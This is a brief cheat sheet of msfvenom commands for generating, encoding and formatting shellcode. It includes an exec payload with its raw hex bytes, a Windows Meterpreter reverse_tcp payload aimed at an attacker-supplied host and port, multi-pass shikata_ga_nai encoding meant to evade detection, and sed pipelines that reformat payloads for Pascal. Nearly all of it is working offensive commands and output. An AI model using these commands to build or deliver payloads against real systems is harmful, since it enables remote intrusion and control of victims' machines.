# Shellcode Format

- **Pipe it through hexdump**

```
$ msfvenom -p linux/x86/exec cmd=whoami R | hexdump -v -e '"\\\x" 1/1 "%02x"'
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 42 bytes

\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x57\x53\x89\xe1\xcd\x80
```

- **Any raw shellcode binary even if it's not related to metasploit using via generic/custom payload**

`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw > payload-x86.bin`

`$ msfvenom -p generic/custom payloadfile=./payload-x86.bin -a x86 --platform windows -f c -o sc.c`

- You can also use a calculator program as a shellcode

`$ msfvenom -p generic/custom payloadfile=/home/user/calc.exe -a x64 --platform windows -f vba-exe`

- **Pipe it through msfvenom**

`$ cat payload-x86.bin | msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai -f c -i 9`

- **Generate formatted Pascal shellcode**

`$ msfvenom -p <payload> -f c | sed -r 's/[\x]+/$/g' | sed -r 's/[\]+/,/g' | sed -r 's/["]+//g' | sed -e 's/$/\,/' | cut -c 2-`